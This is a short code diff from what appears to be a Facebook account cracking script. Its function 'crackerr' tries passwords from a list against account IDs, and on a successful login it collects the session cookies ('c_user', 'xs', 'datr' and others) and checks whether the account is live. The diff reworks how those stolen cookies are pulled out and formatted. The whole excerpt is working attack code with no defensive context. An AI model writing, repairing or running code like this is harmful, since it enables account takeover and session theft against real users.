@@ -554,9 +554,8 @@ def crackerr(ids,passlist):
             response = session.post(url,params=params,data=log_data,headers=headers,allow_redirects=False).text
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                cok = session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                cid = re.findall('c_user=(.*);xs', kuki)[0]
                 check = check_lock(cid)
                 if "live" in check:
                     bkas.append(cid)
